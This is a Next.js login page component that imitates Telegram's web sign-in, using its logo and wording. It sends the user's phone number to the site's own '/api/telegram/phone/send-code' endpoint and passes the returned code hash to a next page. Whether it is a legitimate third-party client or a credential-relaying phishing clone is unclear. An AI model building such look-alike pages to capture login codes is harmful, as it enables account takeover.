"use client";
import { useRouter } from "next/navigation";
import styles from "./page.module.css";
import DropDown from "./components/DropDown";
import { KeepMeSignedIn, NextButton, LoginByQrCode } from "./components/AuthActions";
import { jhola,subscribe, getSnapshot } from "./phoneBridge";
import { useRef, useState,useSyncExternalStore } from "react";

 

export default function LoginPage() {
  const router = useRouter();
  const [sending, setSending] = useState(false);
  // console.log("Use States");
  
  
  // const inFlight = useRef(false);
  
  // const inFlight = useRef(false)
  const { cc, phone } = useSyncExternalStore(subscribe, getSnapshot, getSnapshot);
  const phoneLen = String(phone || '').replace(/\D/g, '').length;
  
  
  
  const handleNext = async (e) => {
    e?.preventDefault?.();
    e?.stopPropagation?.();
    if (sending) return;
    setSending(true);
    
    
    
    try {
      const { cc: ccNow, phone: phoneNow } = getSnapshot();
      if (!phoneNow?.trim()) { alert("Please enter your phone number."); return; }
      
      const ccNorm = String(ccNow || "").trim();
      const full = `${ccNorm.startsWith("+") ? ccNorm : `+${ccNorm}`}${String(phoneNow).replace(/\s+/g, "")}`;
      console.log("Full phone number "+full);

    const res = await fetch("/api/telegram/phone/send-code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phoneNumber: full }),
    });

    // ← Don’t hide parse errors; log raw first
    const raw = await res.clone().text();
    console.log("[send-code] status:", res.status, "raw:", raw);

    let data;
    try { data = JSON.parse(raw); } catch {
      alert("Server returned non-JSON (see console).");
      return;
    }

    if (!res.ok || data?.ok !== true) {
      alert(data?.error || "Failed to send code. Please try again.");
      return;
    }

    const phoneCodeHash = data.phoneCodeHash || "";
    console.log("[send-code] hash:", phoneCodeHash);

    console.log("[router] pushing to /login …");
    // If using cookie flow you can omit hash; this works either way:
    router.push(`/login?phone=${encodeURIComponent(full)}&hash=${encodeURIComponent(phoneCodeHash)}`);
  } catch (err) {
    console.error("[handleNext] error:", err);
    alert("Network error. Please try again.");
  } finally {
    setSending(false);
  }
};


  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-white p-4">
      {/* Telegram logo */}
      <div>
        <img draggable = "false" src="./tele-logo.svg" alt="Telegram Logo" className="w-[10rem] h-[10rem] mb-[2.5rem]" />
      </div>

      <h1 className="text-2xl font-semibold mb-2 text-gray-900 dark:text-gray-900">
        Telegram
      </h1>
      {/* <h1 className="text-2xl font-semibold mb-2">Telegram</h1> */}


      <div className={styles.para}>
        <p className="text-base font-semibold text-center leading-normal mb-6">
          Please confirm your country code and enter your phone number.
        </p>
      </div>

      {/* Child writes into the bridge; no callbacks */}
      <DropDown />

      <div className="mt-6 flex flex-col items-center gap-3">
        <KeepMeSignedIn />
         
        {/* {((phone || '').replace(/\D/g, '')).length === 5  &&  */}
        {  
          
          
          phoneLen > 5 && phoneLen >=5 &&
          
          
          <NextButton onClick={handleNext} disabled={sending} loading={sending} />
           
        }
        {/* {loading={sending}} */}
        
        {/* ← wire NEXT */}
        <div className="mt-6">
          <LoginByQrCode />
        </div>
      </div>
    </div>
  );
}
